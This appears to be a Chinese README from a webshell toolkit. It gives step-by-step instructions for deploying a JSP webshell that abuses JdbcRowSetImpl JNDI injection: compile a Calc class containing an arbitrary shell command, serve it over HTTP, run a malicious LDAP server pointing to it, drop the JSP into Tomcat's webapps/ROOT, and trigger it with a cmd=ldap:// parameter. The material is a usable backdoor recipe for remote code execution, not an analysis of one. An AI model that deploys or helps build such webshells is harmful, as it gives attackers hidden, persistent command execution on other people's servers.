### JdbcRowSetImpl进行jndi注入的JSP WebShell

因为引入了ldap sdk，所以，需要去maven仓库下载个unboundid-ldapsdk-3.1.1.jar

具体的使用：

1. 修改Calc.java中的cmd局部变量为需要执行的shell命令，然后执行javac Calc.java编译得到Calc.class
2. 把上一步得到的Calc.class放到webshell运行环境可访问的http服务器中
3. 把LdapServer.java、OperationInterceptor.java、unboundid-ldapsdk-3.1.1.jar放到同一目录下，执行编译javac -cp unboundid-ldapsdk-3.1.1.jar:. LdapServer.java
4. 执行jar cvf LdapServer.jar LdapServer.class OperationInterceptor.class打包成LdapServer.jar
5. 把LdapServer.jar、unboundid-ldapsdk-3.1.1.jar放到同一目录下，java -cp LdapServer.jar:unboundid-ldapsdk-3.1.1.jar LdapServer 12345 "http://127.0.0.1:80/#Calc",其中12345为ldap server的端口，"http://127.0.0.1:80/#Calc"中的127.0.0.1:80为上一步中可访问的http服务器，因为Calc.class存放于http服务器根目录，所以为Calc（Calc存放在http服务器的文件有后缀.class，但是参数不需要.class）
6. 把jsp放到tomcat的webapps/ROOT/中，访问http://127.0.0.1:8080/13.jsp?cmd=ldap://127.0.0.1:12345，cmd参数即为刚刚上一步启动的ldap server的url